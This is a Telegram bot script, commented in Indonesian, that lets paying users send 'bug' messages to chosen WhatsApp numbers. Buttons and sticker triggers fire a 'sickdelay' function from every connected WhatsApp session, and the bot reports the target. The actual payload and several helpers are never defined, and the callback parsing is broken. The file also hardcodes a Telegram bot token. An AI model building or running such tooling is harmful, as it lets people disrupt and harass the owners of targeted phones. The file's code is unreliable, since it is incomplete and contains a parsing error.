// ==== BOT SETUP ====
const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot("7893093376:AAG4XdCtm0i633B9QQdBSax8sLNTPGyAp4E", { polling: true });

// ==== SIMULASI PREMIUM ====
function isPremium(userId) {
  return [7807425271].includes(userId); // Ganti dengan user premium
}
function isSupervip(userId) {
  return [7807425271].includes(userId); // Ganti dengan user supervip
}

// ==== STICKER TRIGGER ====
const stickerTriggers = {
  "unique_id_sticker_1": "6281234567890", // file_unique_id: target WA
};
const emojiTriggers = {
  "🔥": "6289876543210",
};

// ==== FUNGSI SHOW DELAY ====
async function triggerShowDelay(chatId, userId, targetNumber, msg) {
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  await bot.sendPhoto(chatId, "https://files.catbox.moe/rf8qar.jpg", {
    caption: ` Sellect Button Untuk Mengirim bug ke *${formattedNumber}*`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "〄𝑪𝒉𝒂𝒐𝒔𝑫𝒆𝒍𝒂𝒚༽", callback_data: `delay_cyuk_${jid}` },
          { text: "៹𝑫𝒆𝒍𝒂𝒚𝑨𝒍𝒑𝒉𝒂", callback_data: `delay_beneran_${jid}` }
        ],
        [
          { text: "៹𝑫𝒆𝒍𝒂𝒚⏎", callback_data: `delay_bos_${jid}` },
          { text: "៹𝑫𝒆𝒍𝒂𝒚𝒁𝒊𝒆✇", callback_data: `delay_real_${jid}` }
        ],
        [
          { text: "𝑫𝒆𝒍𝒂𝒚𝑻𝒓𝒂𝒗", callback_data: `delay_serius_${jid}` },
          { text: "➷𝑫𝒆𝒍𝒂𝒚𝑽𝒐𝒖𝒓𝒕𝒉➹", callback_data: `delay_beneran_${jid}` }
        ]
      ],
    },
  });
}

// ==== COMMAND /SHOW_DELAY ====
bot.onText(/\/Show_Delay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" });
  }

  const targetNumber = match[1];
  triggerShowDelay(chatId, userId, targetNumber, msg);
});

// ==== STICKER/EMOJI TRIGGER ====
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) return;

  if (msg.sticker && msg.sticker.file_unique_id) {
    const stickerId = msg.sticker.file_unique_id;
    const targetNumber = stickerTriggers[stickerId];
    if (targetNumber) triggerShowDelay(chatId, userId, targetNumber, msg);
  }

  if (msg.sticker && msg.sticker.emoji) {
    const emoji = msg.sticker.emoji;
    const targetNumber = emojiTriggers[emoji];
    if (targetNumber) triggerShowDelay(chatId, userId, targetNumber, msg);
  }
});

// ==== CALLBACK BUTTON ====
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*", { parse_mode: "Markdown" });
  }

  const [bugType, jid] = data.split("_");

  const bugTypes = {
    "delay_cyuk": [sickdelay],
    "delay_bos": [sickdelay],
    "delay_real": [sickdelay],
    "delay_serius": [sickdelay],
    "delay_beneran": [sickdelay],
  };

  if (!bugTypes[bugType]) return;

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada bot WhatsApp yang terhubung.");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, jid);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  const formattedNumber = jid.replace("@s.whatsapp.net", "");

  bot.sendMessage(chatId, `
\`\`\`
╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${callbackQuery.from.username || 'Unknown'}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝑫𝒆𝒍𝒂𝒚
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${formattedNumber}` },
        ],
      ],
    },
  });
});
